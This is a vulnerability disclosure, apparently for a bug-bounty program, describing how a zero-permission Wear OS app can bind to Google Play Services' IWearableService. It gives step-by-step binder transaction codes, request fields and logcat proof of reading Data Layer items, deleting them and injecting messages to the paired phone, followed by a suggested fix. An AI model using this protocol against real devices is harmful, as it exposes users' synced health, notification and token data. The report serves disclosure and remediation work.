# WearOS Data Layer API: Zero-Permission Full Access to IWearableService

## Summary

A zero-permission application installed on a Pixel Watch 2 (Wear OS) can obtain the `IWearableService` binder from Google Play Services by directly implementing the `IGmsServiceBroker` protocol. Once obtained, the application can read, write, and delete Data Layer items; send arbitrary messages and open raw data channels to the paired phone; and enumerate connected devices and capabilities — all without any Android permissions or Google certificate verification.

## Severity

**High** — Confidentiality and Integrity violation requiring zero permissions.

## Affected Component

- **Package**: `com.google.android.gms` (Google Play Services)
- **Service**: `com.google.android.gms.wearable.service.WearableService`
- **Interface**: `com.google.android.gms.wearable.internal.IWearableService`
- **Build tested**: Pixel Watch 2 (eos), CP2A.260603.001, GMS version 263332086

## Root Cause

The `WearableService` in Google Play Services binds via the standard `IGmsServiceBroker` protocol (action `com.google.android.gms.wearable.BIND`, service ID 14). The broker returns the `IWearableService` binder to any calling application without verifying the caller's identity, permissions, or signature.

While certain privileged operations on `IWearableService` (telephony control, WiFi sync, configuration access) enforce `GoogleCertificatesRslt` signature verification, the core Data Layer operations — which provide read/write/delete access to all synced data and message/channel capabilities — perform **no authorization check at all**.

The GMS client library normally handles connection setup, but the protocol is fully documented in the decompiled source and can be replicated by any application using raw `Parcel` and `Binder` operations.

## Attack Scenario

1. Attacker publishes a WearOS app on Google Play requesting **zero permissions** — no `READ_CONTACTS`, no `BODY_SENSORS`, no `INTERNET`, nothing.
2. User installs the app (no permission prompt appears).
3. The malicious app binds to `WearableService` and obtains the `IWearableService` binder via the `IGmsServiceBroker` protocol.
4. The app reads all Data Layer items from **all** applications (health data, notification content, synced preferences, authentication tokens).
5. The app injects malicious Data Layer messages to the paired phone, triggering actions in any phone-side app that listens for Data Layer messages.
6. The app opens raw data channels to the phone, enabling arbitrary data exfiltration without `INTERNET` permission.

## Proof of Concept

### Prerequisites
- Pixel Watch 2 (eos) with CP2A.260603.001
- ADB access for installation only (exploit runs entirely on-device)
- Zero-permission APK (`com.poc.datalayer`)

### Steps to Reproduce

1. Install `poc_datalayer/build/datalayer_v4.apk` on the Pixel Watch 2
2. Launch the "DL Probe" app from the watch launcher
3. Observe logcat output (tag: `DATALAYER_PROBE`)

### Exploit Protocol

```
1. bindService("com.google.android.gms.wearable.BIND")
   → Returns IGmsServiceBroker binder

2. transact(46) on IGmsServiceBroker with:
   - IGmsCallbacks binder (our callback)
   - GetServiceRequest SafeParcel:
     * version = 6
     * serviceId = 14 (Wearable API)
     * gmsVersion = 263332086
     * callingPackage = "com.poc.datalayer"
   → Async callback delivers IWearableService binder

3. IWearableService is now fully accessible:
   - getLocalNode(14): device identity
   - getConnectedNodes(15): paired device list
   - getDataItems(8): read ALL synced data
   - sendMessage(12): inject messages to phone
   - deleteDataItems(11): delete synced data
   - openChannel(31): raw data channel to phone
```

### Dynamic Evidence (from logcat)

```
=== Phase 1: Get IWearableService ===
[+] GMS callback code=3 status=0
[!!!] Service: com.google.android.gms.wearable.internal.IWearableService

=== Phase 2: Get local node ===
[+] Code 14: accepted
[+] LocalNode status: 0
[!!!] Node[local]: id=6efd13d9 name=Google Pixel Watch 2 hops=0 nearby=true

=== Phase 3: Get connected nodes ===
[+] ConnectedNodes status: 0
[+] Connected nodes count: 1
[!!!] Node[peer_0]: id=96eb2ede name=¯\_(ツ)_/¯ hops=1 nearby=true

=== Phase 4: Get Data Layer items ===
[+] Code 8: accepted
[+] DataHolder raw size: 164 bytes

=== Phase 5: Send message ===
[*] Target: ¯\_(ツ)_/¯ (96eb2ede)
[*] Sending to node: 96eb2ede
[*] Path: /poc/zero_perm_test
[+] Code 12: accepted
[+] SendMessage status: 0
[+] SendMessage reqId: 18659
[!!!] MESSAGE SENT SUCCESSFULLY TO PHONE!

=== Phase 6: Capability enumeration ===
[+] Code 43: accepted
```

Additional write/delete test:
```
=== Test: deleteDataItems (code 11) ===
[+] deleteData accepted
[CB:deleteData] status=0

=== Test: openChannel (code 31) ===
[+] openChannel accepted
[CB:openChannel] status=0
```

## Impact Analysis

### Operations Accessible (NO authorization check)
| Operation | Code | Impact |
|-----------|------|--------|
| getLocalNode | 14 | Leaks device model and node ID |
| getConnectedNodes | 15 | Leaks paired phone identity and custom name |
| getDataItems | 8 | Reads ALL Data Layer items from ALL apps |
| getDataItemsByUri | 9 | Reads specific Data Layer URIs |
| sendMessage | 12 | Injects messages to paired phone |
| deleteDataItems | 11 | Deletes Data Layer items (availability) |
| openChannel | 31 | Opens raw data channel to phone |
| getAllCapabilities | 43 | Enumerates registered capabilities |
| putData | 6 | Writes Data Layer items (integrity) |

### Operations Blocked (GoogleCertificatesRslt check)
| Operation | Code |
|-----------|------|
| endCall | 25 |
| acceptRingingCall | 26 |
| syncWifiCredentials | 37 |
| getConfigs | 22 |
| getStorageInformation | 18 |

### Confidentiality Impact
- **Device identity**: Watch model, node ID, and paired phone's custom display name exposed
- **Cross-app data access**: All Data Layer items from all apps are readable, including:
  - Health/fitness data synced between watch and phone
  - Notification content bridged via Data Layer
  - Application preferences and authentication state
  - Any data apps sync via `DataClient.putDataItem()`

### Integrity Impact
- **Message injection**: Arbitrary messages sent to the phone appear to originate from the watch. Any phone-side `WearableListenerService` or `MessageClient.OnMessageReceivedListener` may process injected messages.
- **Data injection**: Malicious data items written to the Data Layer are visible to all apps.
- **Data deletion**: Attacker can delete legitimate Data Layer items, disrupting sync.

### Availability Impact
- Data deletion disrupts cross-device sync for all applications
- Channel opening consumes resources on both watch and phone

## Suggested Fix

The `WearableService` should verify the calling application's identity before returning the `IWearableService` binder and before processing Data Layer operations:

1. **At binder creation**: Verify `Binder.getCallingUid()` maps to an application that has declared the Wearable API dependency in its manifest and has been granted appropriate scopes.
2. **Per-operation**: Scope Data Layer access to the calling application's own namespace. An app with package `com.example.app` should only be able to read/write/delete data items under `wear://com.example.app/*`, not `wear://*`.
3. **Message filtering**: Messages sent via `sendMessage` should be attributed to the sending application's package and only delivered to the same package on the receiving device.

## Files

- `poc_datalayer/src/com/poc/datalayer/DataLayerProbe.java` — Main PoC (Phase 1-6)
- `poc_datalayer/src/com/poc/datalayer/DataLayerExploit.java` — Write/delete test
- `poc_datalayer/AndroidManifest.xml` — Zero-permission manifest
- `poc_datalayer/build/datalayer_v4.apk` — Pre-built APK
- `dynamic_evidence/datalayer_exploit_proof.log` — Logcat evidence
